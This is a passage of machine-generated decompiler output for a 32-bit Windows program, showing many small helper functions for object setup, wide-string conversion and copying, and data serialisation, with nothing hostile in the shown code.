    // 0x40451e
    *v6 = v1;
    *(char *)(v1 + v5) = 0;
    function_404422((char *)&g322);
    *(int32_t *)(v4 - 8) = v1;
    function_401014((int32_t)&g322);
    return result;
}

// Address range: 0x40453a - 0x40455a
int32_t function_40453a(int32_t * a1) {
    // 0x40453a
    int32_t v1; // 0x40453a
    if (v1 != 0) {
        // 0x404544
        PathFindExtensionW((int16_t *)v1);
    }
    // 0x40454b
    function_40460a((int16_t *)&g322);
    return (int32_t)a1;
}

// Address range: 0x40455a - 0x40456d
int32_t function_40455a(int32_t result) {
    // 0x40455a
    int32_t v1; // 0x40455a
    function_404656(v1);
    return result;
}

// Address range: 0x40456d - 0x4045f0
int32_t function_40456d(int32_t * a1) {
    // 0x40456d
    *a1 = 0;
    int32_t lpWideCharStr; // 0x40456d
    if (lpWideCharStr != 0) {
        int32_t cbMultiByte = WideCharToMultiByte(0, 512, (int16_t *)lpWideCharStr, function_4045f0(), NULL, 0, NULL, NULL); // 0x404595
        char * lpMultiByteStr = (char *)function_406f2c(); // 0x4045b3
        WideCharToMultiByte(0xfde9, 0, NULL, function_4045f0(), lpMultiByteStr, cbMultiByte, NULL, NULL);
        function_40415d(function_40434f(lpMultiByteStr));
        function_406f1d();
        function_406f1d();
    }
    // 0x4045ea
    return (int32_t)a1;
}

// Address range: 0x4045f0 - 0x404601
int32_t function_4045f0(void) {
    // 0x4045f0
    int32_t lpString; // 0x4045f0
    if (lpString == 0) {
        // 0x4045fe
        return 0;
    }
    // 0x4045f5
    return lstrlenW((int16_t *)lpString);
}

// Address range: 0x404601 - 0x404604
int32_t function_404601(void) {
    // 0x404601
    int32_t result; // 0x404601
    return result;
}

// Address range: 0x404604 - 0x40460a
int32_t function_404604(void) {
    // 0x404604
    int32_t result; // 0x404604
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x40460a - 0x404656
int32_t function_40460a(int16_t * lpString) {
    int32_t lpString1 = 2 * lstrlenW(lpString) + 2; // 0x404619
    int32_t result; // 0x40460a
    *(int32_t *)result = function_406e8d();
    function_401293((int32_t *)lpString1, 0, 2 * lstrlenW(lpString) + 2);
    lstrcpyW((int16_t *)lpString1, lpString);
    return result;
}

// Address range: 0x404656 - 0x40468e
int32_t function_404656(int32_t a1) {
    // 0x404656
    int32_t result; // 0x404656
    int32_t * v1 = (int32_t *)result; // 0x404660
    *v1 = 0;
    int32_t * lpString2 = (int32_t *)a1; // 0x404663
    if (*lpString2 != 0) {
        // 0x404668
        function_4045f0();
        int32_t lpString1 = function_406f2c(); // 0x404676
        *v1 = lpString1;
        lstrcpyW((int16_t *)lpString1, (int16_t *)*lpString2);
    }
    // 0x404686
    return result;
}

// Address range: 0x40468e - 0x4046a9
int32_t function_40468e(int32_t a1) {
    // 0x40468e
    int32_t v1; // 0x40468e
    function_403fc7((int32_t)&v1, 2);
    int32_t result; // 0x40468e
    return result;
}

// Address range: 0x4046a9 - 0x4046c6
int32_t function_4046a9(int32_t a1) {
    // 0x4046a9
    function_403fc7(*(int32_t *)a1, *(int32_t *)(a1 + 4));
    int32_t result; // 0x4046a9
    return result;
}

// Address range: 0x4046c6 - 0x4046da
int32_t function_4046c6(void) {
    // 0x4046c6
    function_404081();
    return function_404081();
}

// Address range: 0x4046da - 0x404740
int32_t function_4046da(int32_t result) {
    int32_t v1 = -0x1b9944d7; // bp-8, 0x4046e2
    int32_t v2; // 0x4046da
    int32_t * v3 = (int32_t *)(v2 + 20); // 0x4046ef
    int32_t v4 = v2 + 8; // 0x4046f2
    int32_t v5 = &v1; // 0x4046f5
    function_403fc7(v5, 4);
    v1 = *v3;
    function_403fc7(v5, 4);
    v1 = v4;
    function_403fc7(v5, 4);
    function_403fc7(*(int32_t *)(v2 + 16), *v3);
    function_404094(v4);
    return result;
}

// Address range: 0x404740 - 0x404767
int32_t function_404740(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    function_403fc7((int32_t)&v1, 8);
    int32_t result; // 0x404740
    return result;
}

// Address range: 0x404767 - 0x404788
int32_t function_404767(int32_t a1) {
    int32_t v1 = a1;
    function_403fc7((int32_t)&v1, 4);
    int32_t result; // 0x404767
    return result;
}

// Address range: 0x404788 - 0x4047c6
int32_t function_404788(int32_t a1) {
    int32_t v1 = function_404314(); // 0x40479a
    function_403fc7((int32_t)&v1, 4);
    int32_t v2 = function_404314(); // 0x4047ad
    function_403fc7(*(int32_t *)a1, v2);
    int32_t result; // 0x404788
    return result;
}

// Address range: 0x4047c6 - 0x4047e5
int32_t function_4047c6(int32_t a1) {
    // 0x4047c6
    int32_t result; // 0x4047c6
    *(int32_t *)result = a1;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)(result + 20) = 0;
    return result;
}

// Address range: 0x4047e5 - 0x4047fc
int32_t function_4047e5(int32_t a1, int32_t a2) {
    // 0x4047e5
    int32_t v1; // 0x4047e5
    *(int32_t *)v1 = (int32_t)&g21;
    int32_t result = function_406f1d(); // 0x4047f1
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x4047fc - 0x40482b
int32_t function_4047fc(int32_t a1) {
    // 0x4047fc
    function_4043c7(function_415dc4(*(int32_t *)*(int32_t *)a1));
    return function_406f1d();
}

// Address range: 0x40482b - 0x404838
int32_t function_40482b(void) {
    // 0x40482b
    int32_t result; // 0x40482b
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g21;
    return result;
}

// Address range: 0x404838 - 0x404867
int32_t function_404838(int32_t a1) {
    // 0x404838
    function_4043c7(function_415dc4(*(int32_t *)*(int32_t *)a1));
    return function_406f1d();
}

// Address range: 0x404867 - 0x40487e
int32_t function_404867(int32_t a1, int32_t a2) {
    // 0x404867
    int32_t v1; // 0x404867
    *(int32_t *)v1 = (int32_t)&g22;
    int32_t result = function_406f1d(); // 0x404873
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x40487e - 0x40488b
int32_t function_40487e(void) {
    // 0x40487e
    int32_t result; // 0x40487e
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g22;
    return result;
}

// Address range: 0x40488b - 0x4048a2
int32_t function_40488b(int32_t a1, int32_t a2) {
    // 0x40488b
    int32_t v1; // 0x40488b
    *(int32_t *)v1 = (int32_t)&g23;
    int32_t result = function_406f1d(); // 0x404897
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x4048a2 - 0x4048d9
int32_t function_4048a2(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x4048ae
    int32_t v2; // 0x4048a2
    *(int32_t *)(v2 + 4) = *(int32_t *)*v1;
    function_4043c7(function_415dc4(*(int32_t *)(*v1 + 4)));
    return function_406f1d();
}

// Address range: 0x4048d9 - 0x4048e6
int32_t function_4048d9(void) {
    // 0x4048d9
    int32_t result; // 0x4048d9
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)result = (int32_t)&g23;
    return result;
}

// Address range: 0x4048e6 - 0x4048f7
int32_t function_4048e6(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x4048ee
    int32_t v1; // 0x4048e6
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x4048f7 - 0x4048fe
int32_t function_4048f7(void) {
    // 0x4048f7
    int32_t result; // 0x4048f7
    *(int32_t *)result = (int32_t)&g24;
    return result;
}

// Address range: 0x4048fe - 0x404907
int32_t function_4048fe(void) {
    // 0x4048fe
    int32_t result; // 0x4048fe
    *(int32_t *)result = (int32_t)&g24;
    return result;
}

// Address range: 0x404907 - 0x40490b
int32_t function_404907(void) {
    // 0x404907
    int32_t v1; // 0x404907
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x40490b - 0x40490e
int32_t function_40490b(void) {
    // 0x40490b
    int32_t result; // 0x40490b
    return result;
}

// Address range: 0x40490e - 0x404915
int32_t function_40490e(void) {
    // 0x40490e
    int32_t result; // 0x40490e
    *(int32_t *)result = (int32_t)&g25;
    return result;
}

// Address range: 0x404915 - 0x404918
int32_t function_404915(void) {
    // 0x404915
    int32_t result; // 0x404915
    return result;
}

// Address range: 0x404918 - 0x40491f
int32_t function_404918(void) {
    // 0x404918
    int32_t result; // 0x404918
    *(int32_t *)result = (int32_t)&g26;
    return result;
}

// Address range: 0x40491f - 0x404928
int32_t function_40491f(void) {
    // 0x40491f
    int32_t result; // 0x40491f
    *(int32_t *)result = (int32_t)&g26;
    return result;
}

// Address range: 0x404928 - 0x40496c
int32_t function_404928(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x404933
    int32_t v2; // 0x404928
    *(int32_t *)(v2 + 4) = *(int32_t *)*v1;
    *(char *)(v2 + 8) = (char)(*(char *)(*v1 + 4) != 0);
    int32_t v3; // bp-12, 0x404928
    int32_t v4 = function_403e83(&v3, 9, *(int32_t *)(*v1 + 5)); // 0x404951
    function_403eca(v4);
    return function_404081();
}

// Address range: 0x40496c - 0x40497a
int32_t function_40496c(int32_t a1, int32_t a2) {
    // 0x40496c
    int32_t v1; // 0x40496c
    *(int32_t *)v1 = (int32_t)&g27;
    return function_404081();
}

// Address range: 0x40497a - 0x40498b
int32_t function_40497a(void) {
    // 0x40497a
    int32_t result; // 0x40497a
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)result = (int32_t)&g27;
    return result;
}

// Address range: 0x40498b - 0x404992
int32_t function_40498b(void) {
    // 0x40498b
    int32_t result; // 0x40498b
    *(int32_t *)result = (int32_t)&g28;
    return result;
}

// Address range: 0x404992 - 0x4049a3
int32_t function_404992(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x40499a
    int32_t v1; // 0x404992
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x4049a3 - 0x4049ac
int32_t function_4049a3(void) {
    // 0x4049a3
    int32_t result; // 0x4049a3
    *(int32_t *)result = (int32_t)&g28;
    return result;
}

// Address range: 0x4049ac - 0x4049af
int32_t function_4049ac(void) {
    // 0x4049ac
    int32_t result; // 0x4049ac
    return result;
}

// Address range: 0x4049af - 0x4049b6
int32_t function_4049af(void) {
    // 0x4049af
    int32_t result; // 0x4049af
    *(int32_t *)result = (int32_t)&g29;
    return result;
}

// Address range: 0x4049b6 - 0x4049bf
int32_t function_4049b6(void) {
    // 0x4049b6
    int32_t result; // 0x4049b6
    *(int32_t *)result = (int32_t)&g29;
    return result;
}

// Address range: 0x4049bf - 0x4049ee
int32_t function_4049bf(int32_t a1) {
    // 0x4049bf
    function_4043c7(function_415dc4(*(int32_t *)*(int32_t *)a1));
    return function_406f1d();
}

// Address range: 0x4049ee - 0x4049fb
int32_t function_4049ee(void) {
    // 0x4049ee
    int32_t result; // 0x4049ee
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g30;
    return result;
}

// Address range: 0x4049fb - 0x404a12
int32_t function_4049fb(void) {
    // 0x4049fb
    int32_t v1; // 0x4049fb
    *(int32_t *)v1 = (int32_t)&g30;
    int32_t result = function_406f1d(); // 0x404a07
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x404a12 - 0x404a39
int32_t function_404a12(int32_t a1) {
    int32_t v1 = a1;
    int32_t result; // 0x404a12
    *(int32_t *)result = (int32_t)&g30;
    function_404656((int32_t)&v1);
    function_406f1d();
    return result;
}

// Address range: 0x404a39 - 0x404a40
int32_t function_404a39(void) {
    // 0x404a39
    int32_t result; // 0x404a39
    *(int32_t *)result = (int32_t)&g31;
    return result;
}

// Address range: 0x404a40 - 0x404a43
int32_t function_404a40(void) {
    // 0x404a40
    int32_t result; // 0x404a40
    return result;
}

// Address range: 0x404a43 - 0x404a4c
int32_t function_404a43(void) {
    // 0x404a43
    int32_t result; // 0x404a43
    *(int32_t *)result = (int32_t)&g31;
    return result;
}

// Address range: 0x404a4c - 0x404a53
int32_t function_404a4c(void) {
    // 0x404a4c
    int32_t result; // 0x404a4c
    *(int32_t *)result = (int32_t)&g32;
    return result;
}

// Address range: 0x404a53 - 0x404a56
int32_t function_404a53(void) {
    // 0x404a53
    int32_t result; // 0x404a53
    return result;
}

// Address range: 0x404a56 - 0x404a5f
int32_t function_404a56(void) {
    // 0x404a56
    int32_t result; // 0x404a56
    *(int32_t *)result = (int32_t)&g32;
    return result;
}

// Address range: 0x404a5f - 0x404a62
int32_t function_404a5f(void) {
    // 0x404a5f
    int32_t result; // 0x404a5f
    return result;
}

// Address range: 0x404a62 - 0x404a69
int32_t function_404a62(void) {
    // 0x404a62
    int32_t result; // 0x404a62
    *(int32_t *)result = (int32_t)&g33;
    return result;
}

// Address range: 0x404a69 - 0x404a72
int32_t function_404a69(void) {
    // 0x404a69
    int32_t result; // 0x404a69
    *(int32_t *)result = (int32_t)&g33;
    return result;
}

// Address range: 0x404a72 - 0x404a75
int32_t function_404a72(void) {
    // 0x404a72
    int32_t result; // 0x404a72
    return result;
}

// Address range: 0x404a75 - 0x404a7c
int32_t function_404a75(void) {
    // 0x404a75
    int32_t result; // 0x404a75
    *(int32_t *)result = (int32_t)&g34;
    return result;
}

// Address range: 0x404a7c - 0x404a85
int32_t function_404a7c(void) {
    // 0x404a7c
    int32_t result; // 0x404a7c
    *(int32_t *)result = (int32_t)&g34;
    return result;
}

// Address range: 0x404a85 - 0x404a88
int32_t function_404a85(void) {
    // 0x404a85
    int32_t result; // 0x404a85
    return result;
}

// Address range: 0x404a88 - 0x404a8f
int32_t function_404a88(void) {
    // 0x404a88
    int32_t result; // 0x404a88
    *(int32_t *)result = (int32_t)&g35;
    return result;
}

// Address range: 0x404a8f - 0x404a98
int32_t function_404a8f(void) {
    // 0x404a8f
    int32_t result; // 0x404a8f
    *(int32_t *)result = (int32_t)&g35;
    return result;
}

// Address range: 0x404a98 - 0x404a9b
int32_t function_404a98(void) {
    // 0x404a98
    int32_t result; // 0x404a98
    return result;
}

// Address range: 0x404a9b - 0x404aa2
int32_t function_404a9b(void) {
    // 0x404a9b
    int32_t result; // 0x404a9b
    *(int32_t *)result = (int32_t)&g36;
    return result;
}

// Address range: 0x404aa2 - 0x404aab
int32_t function_404aa2(void) {
    // 0x404aa2
    int32_t result; // 0x404aa2
    *(int32_t *)result = (int32_t)&g36;
    return result;
}

// Address range: 0x404aab - 0x404ae7
int32_t function_404aab(int32_t result) {
    // 0x404aab
    int128_t v1; // 0x404aab
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404767((int32_t)&g322);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x404ae7 - 0x404aee
int32_t function_404ae7(void) {
    // 0x404ae7
    int32_t result; // 0x404ae7
    *(int32_t *)result = (int32_t)&g37;
    return result;
}

// Address range: 0x404aee - 0x404b03
int32_t function_404aee(int32_t a1) {
    // 0x404aee
    int32_t result; // 0x404aee
    *(int32_t *)(result + 4) = a1;
    *(int32_t *)result = (int32_t)&g37;
    return result;
}

// Address range: 0x404b03 - 0x404b14
int32_t function_404b03(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x404b0b
    int32_t v1; // 0x404b03
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x404b14 - 0x404b1b
int32_t function_404b14(void) {
    // 0x404b14
    int32_t result; // 0x404b14
    *(int32_t *)result = (int32_t)&g38;
    return result;
}

// Address range: 0x404b1b - 0x404b24
int32_t function_404b1b(void) {
    // 0x404b1b
    int32_t result; // 0x404b1b
    *(int32_t *)result = (int32_t)&g38;
    return result;
}

// Address range: 0x404b24 - 0x404b28
int32_t function_404b24(void) {
    // 0x404b24
    int32_t v1; // 0x404b24
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x404b28 - 0x404b2b
int32_t function_404b28(void) {
    // 0x404b28
    int32_t result; // 0x404b28
    return result;
}

// Address range: 0x404b2b - 0x404b32
int32_t function_404b2b(void) {
    // 0x404b2b
    int32_t result; // 0x404b2b
    *(int32_t *)result = (int32_t)&g39;
    return result;
}

// Address range: 0x404b32 - 0x404b3b
int32_t function_404b32(void) {
    // 0x404b32
    int32_t result; // 0x404b32
    *(int32_t *)result = (int32_t)&g39;
    return result;
}

// Address range: 0x404b3b - 0x404c0e
int32_t function_404b3b(int32_t result) {
    // 0x404b3b
    int128_t v1; // 0x404b3b
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404767((int32_t)&g322);
    int32_t v3; // 0x404b3b
    int32_t v4 = v3 + 4; // 0x404b6b
    int32_t v5 = v4; // bp-80, 0x404b6e
    int32_t v6 = &v5; // 0x404b6e
    function_404788(v4);
    int32_t * v7 = (int32_t *)(v3 + 16); // 0x404b78
    int32_t v8 = 0; // 0x404b7b
    if (*v7 == 0) {
        // 0x404bed
        *(int32_t *)(v6 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t v9 = v6;
    *(int32_t *)(v9 - 4) = v8;
    *(int32_t *)(v9 - 8) = v9 + 40;
    int32_t v10 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x404b88
    *(int32_t *)(v9 - 12) = v10;
    function_404788((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 - 16) = v8;
    *(int32_t *)(v9 - 20) = v9 + 28;
    int32_t v11 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x404ba8
    *(int32_t *)(v9 - 24) = *(int32_t *)(v11 + 16);
    function_404767((int32_t)&g322);
    function_406f1d();
    *(int32_t *)(v9 - 28) = v8;
    *(int32_t *)(v9 - 32) = v9 + 16;
    int32_t v12 = function_401c0a((int32_t)&g322, (int32_t)&g322); // 0x404bca
    *(int32_t *)(v9 - 36) = *(int32_t *)(v12 + 12);
    int32_t v13 = v9 - 40; // 0x404bd6
    *(int32_t *)v13 = *(int32_t *)(v12 + 8);
    function_404740((int32_t)&g322, (int32_t)&g322);
    function_406f1d();
    v8++;
    while (v8 < *v7) {
        // 0x404b80
        v9 = v13;
        *(int32_t *)(v9 - 4) = v8;
        *(int32_t *)(v9 - 8) = v9 + 40;
        v10 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 12) = v10;
        function_404788((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 - 16) = v8;
        *(int32_t *)(v9 - 20) = v9 + 28;
        v11 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 24) = *(int32_t *)(v11 + 16);
        function_404767((int32_t)&g322);
        function_406f1d();
        *(int32_t *)(v9 - 28) = v8;
        *(int32_t *)(v9 - 32) = v9 + 16;
        v12 = function_401c0a((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v9 - 36) = *(int32_t *)(v12 + 12);
        v13 = v9 - 40;
        *(int32_t *)v13 = *(int32_t *)(v12 + 8);
        function_404740((int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        v8++;
    }
    // 0x404bed
    *(int32_t *)(v13 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x404c0e - 0x404c2d
int32_t function_404c0e(void) {
    // 0x404c0e
    int32_t v1; // 0x404c0e
    *(int32_t *)v1 = (int32_t)&g40;
    function_401586();
    int32_t result = function_406f1d(); // 0x404c22
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x404c2d - 0x404c8f
int32_t function_404c2d(int32_t a1, int32_t a2) {
    int32_t v1 = a2;
    int32_t result; // 0x404c2d
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)result = (int32_t)&g40;
    *(int32_t *)(result + 20) = 5;
    *(int32_t *)(result + 12) = 5;
    function_401bbd();
    function_4043c7((int32_t)&v1);
    int32_t v2; // bp+12, 0x404c2d
    function_401fd0(&v2);
    *(int32_t *)(result + 24) = a1;
    function_406f1d();
    v1 = 0;
    function_401586();
    return result;
}

// Address range: 0x404c8f - 0x404ccf
int32_t function_404c8f(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x404c9a
    int32_t v2; // 0x404c8f
    *(int32_t *)(v2 + 4) = *(int32_t *)*v1;
    *(int32_t *)(v2 + 8) = *(int32_t *)(*v1 + 4);
    int32_t v3; // bp-12, 0x404c8f
    int32_t v4 = function_403e83(&v3, 16, *(int32_t *)(*v1 + 12)); // 0x404cb4
    function_403eca(v4);
    return function_404081();
}

// Address range: 0x404ccf - 0x404cdd
int32_t function_404ccf(int32_t a1, int32_t a2) {
    // 0x404ccf
    int32_t v1; // 0x404ccf
    *(int32_t *)v1 = (int32_t)&g41;
    return function_404081();
}

// Address range: 0x404cdd - 0x404cee
int32_t function_404cdd(void) {
    // 0x404cdd
    int32_t result; // 0x404cdd
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    *(int32_t *)result = (int32_t)&g41;
    return result;
}

// Address range: 0x404cee - 0x404cfc
int32_t function_404cee(void) {
    // 0x404cee
    int32_t v1; // 0x404cee
    *(int32_t *)v1 = (int32_t)&g42;
    return function_406f1d();
}

// Address range: 0x404cfc - 0x404d40
int32_t function_404cfc(int32_t a1) {
    // 0x404cfc
    function_415dc4(*(int32_t *)*(int32_t *)a1);
    int32_t v1; // bp-8, 0x404cfc
    int32_t v2 = function_40456d(&v1); // 0x404d1d
    function_40415d(v2);
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x404d40 - 0x404d4d
int32_t function_404d40(void) {
    // 0x404d40
    int32_t result; // 0x404d40
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g42;
    return result;
}

// Address range: 0x404d4d - 0x404d50
int32_t function_404d4d(void) {
    // 0x404d4d
    int32_t result; // 0x404d4d
    return result;
}

// Address range: 0x404d50 - 0x404d57
int32_t function_404d50(void) {
    // 0x404d50
    int32_t result; // 0x404d50
    *(int32_t *)result = (int32_t)&g43;
    return result;
}

// Address range: 0x404d57 - 0x404d60
int32_t function_404d57(void) {
    // 0x404d57
    int32_t result; // 0x404d57
    *(int32_t *)result = (int32_t)&g43;
    return result;
}

// Address range: 0x404d60 - 0x404d63
int32_t function_404d60(void) {
    // 0x404d60
    int32_t result; // 0x404d60
    return result;
}

// Address range: 0x404d63 - 0x404d6a
int32_t function_404d63(void) {
    // 0x404d63
    int32_t result; // 0x404d63
    *(int32_t *)result = (int32_t)&g44;
    return result;
}

// Address range: 0x404d6a - 0x404d73
int32_t function_404d6a(void) {
    // 0x404d6a
    int32_t result; // 0x404d6a
    *(int32_t *)result = (int32_t)&g44;
    return result;
}

// Address range: 0x404d73 - 0x404d84
int32_t function_404d73(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x404d7b
    int32_t v1; // 0x404d73
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x404d84 - 0x404d8b
int32_t function_404d84(void) {
    // 0x404d84
    int32_t result; // 0x404d84
    *(int32_t *)result = (int32_t)&g45;
    return result;
}

// Address range: 0x404d8b - 0x404d94
int32_t function_404d8b(void) {
    // 0x404d8b
    int32_t result; // 0x404d8b
    *(int32_t *)result = (int32_t)&g45;
    return result;
}

// Address range: 0x404d94 - 0x404d98
int32_t function_404d94(void) {
    // 0x404d94
    int32_t v1; // 0x404d94
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x404d98 - 0x404d9b
int32_t function_404d98(void) {
    // 0x404d98
    int32_t result; // 0x404d98
    return result;
}

// Address range: 0x404d9b - 0x404da2
int32_t function_404d9b(void) {
    // 0x404d9b
    int32_t result; // 0x404d9b
    *(int32_t *)result = (int32_t)&g46;
    return result;
}

// Address range: 0x404da2 - 0x404dab
int32_t function_404da2(void) {
    // 0x404da2
    int32_t result; // 0x404da2
    *(int32_t *)result = (int32_t)&g46;
    return result;
}

// Address range: 0x404dab - 0x404dae
int32_t function_404dab(void) {
    // 0x404dab
    int32_t result; // 0x404dab
    return result;
}

// Address range: 0x404dae - 0x404db5
int32_t function_404dae(void) {
    // 0x404dae
    int32_t result; // 0x404dae
    *(int32_t *)result = (int32_t)&g47;
    return result;
}

// Address range: 0x404db5 - 0x404dbe
int32_t function_404db5(void) {
    // 0x404db5
    int32_t result; // 0x404db5
    *(int32_t *)result = (int32_t)&g47;
    return result;
}

// Address range: 0x404dbe - 0x404dc1
int32_t function_404dbe(void) {
    // 0x404dbe
    int32_t result; // 0x404dbe
    return result;
}

// Address range: 0x404dc1 - 0x404dc8
int32_t function_404dc1(void) {
    // 0x404dc1
    int32_t result; // 0x404dc1
    *(int32_t *)result = (int32_t)&g48;
    return result;
}

// Address range: 0x404dc8 - 0x404dd1
int32_t function_404dc8(void) {
    // 0x404dc8
    int32_t result; // 0x404dc8
    *(int32_t *)result = (int32_t)&g48;
    return result;
}

// Address range: 0x404dd1 - 0x404e54
int32_t function_404dd1(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x404de1
    int32_t v2; // 0x404dd1
    *(int32_t *)(v2 + 4) = *(int32_t *)*v1;
    int32_t v3 = *(int32_t *)(*v1 + 4); // 0x404dea
    function_4043c7(function_415dc4(v3));
    function_406f1d();
    *(int32_t *)(v2 + 16) = *(int32_t *)(v3 + 8 + *v1);
    *(int32_t *)(v2 + 12) = *(int32_t *)(v3 + 12 + *v1);
    *(char *)(v2 + 20) = (char)(*(char *)(v3 + 16 + *v1) != 0);
    int32_t v4; // bp-12, 0x404dd1
    int32_t v5 = function_403e83(&v4, v3 + 21, *(int32_t *)(v3 + 17 + *v1)); // 0x404e37
    function_403eca(v5);
    return function_404081();
}

// Address range: 0x404e54 - 0x404e73
int32_t function_404e54(void) {
    // 0x404e54
    int32_t v1; // 0x404e54
    *(int32_t *)v1 = (int32_t)&g49;
    function_404081();
    int32_t result = function_406f1d(); // 0x404e68
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x404e73 - 0x404e87
int32_t function_404e73(void) {
    // 0x404e73
    int32_t result; // 0x404e73
    *(int32_t *)result = (int32_t)&g49;
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 28) = 0;
    return result;
}

// Address range: 0x404e87 - 0x404e98
int32_t function_404e87(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x404e8f
    int32_t v1; // 0x404e87
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x404e98 - 0x404eca
int32_t function_404e98(int32_t result) {
    // 0x404e98
    int128_t v1; // 0x404e98
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x404eca - 0x404ed8
int32_t function_404eca(void) {
    // 0x404eca
    int32_t result; // 0x404eca
    *(int32_t *)result = (int32_t)&g50;
    *(int32_t *)(result + 4) = (int32_t)&g51;
    return result;
}

// Address range: 0x404ed8 - 0x404ee8
int32_t function_404ed8(void) {
    // 0x404ed8
    int32_t result; // 0x404ed8
    *(int32_t *)result = (int32_t)&g50;
    *(int32_t *)(result + 4) = (int32_t)&g51;
    return result;
}

// Address range: 0x404ee8 - 0x404f18
int32_t function_404ee8(int32_t a1) {
    // 0x404ee8
    int32_t v1; // bp-12, 0x404ee8
    int32_t v2 = function_403e83(&v1, 4, *(int32_t *)*(int32_t *)a1); // 0x404efd
    function_403eca(v2);
    return function_404081();
}

// Address range: 0x404f18 - 0x404f63
int32_t function_404f18(int32_t result) {
    // 0x404f18
    int128_t v1; // 0x404f18
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x404f18
    function_404767(*(int32_t *)(v3 + 12));
    function_4046a9(v3 + 8);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x404f63 - 0x404f78
int32_t function_404f63(int32_t a1, int32_t a2) {
    // 0x404f63
    int32_t v1; // 0x404f63
    *(int32_t *)v1 = (int32_t)&g52;
    *(int32_t *)(v1 + 4) = (int32_t)&g53;
    return function_404081();
}

// Address range: 0x404f78 - 0x404f90
int32_t function_404f78(void) {
    // 0x404f78
    int32_t result; // 0x404f78
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)result = (int32_t)&g52;
    *(int32_t *)(result + 4) = (int32_t)&g53;
    return result;
}

// Address range: 0x404f90 - 0x404f93
int32_t function_404f90(void) {
    // 0x404f90
    int32_t result; // 0x404f90
    return result;
}

// Address range: 0x404f93 - 0x404fc5
int32_t function_404f93(int32_t result) {
    // 0x404f93
    int128_t v1; // 0x404f93
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x404fc5 - 0x404fd3
int32_t function_404fc5(void) {
    // 0x404fc5
    int32_t result; // 0x404fc5
    *(int32_t *)result = (int32_t)&g55;
    *(int32_t *)(result + 4) = (int32_t)&g54;
    return result;
}

// Address range: 0x404fd3 - 0x404fe3
int32_t function_404fd3(void) {
    // 0x404fd3
    int32_t result; // 0x404fd3
    *(int32_t *)result = (int32_t)&g55;
    *(int32_t *)(result + 4) = (int32_t)&g54;
    return result;
}

// Address range: 0x404fe3 - 0x40502e
int32_t function_404fe3(int32_t result) {
    // 0x404fe3
    int128_t v1; // 0x404fe3
    int128_t v2 = v1;
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v3; // 0x404fe3
    function_404767(*(int32_t *)(v3 + 4));
    function_404788(v3 + 8);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x40502e - 0x405045
int32_t function_40502e(void) {
    // 0x40502e
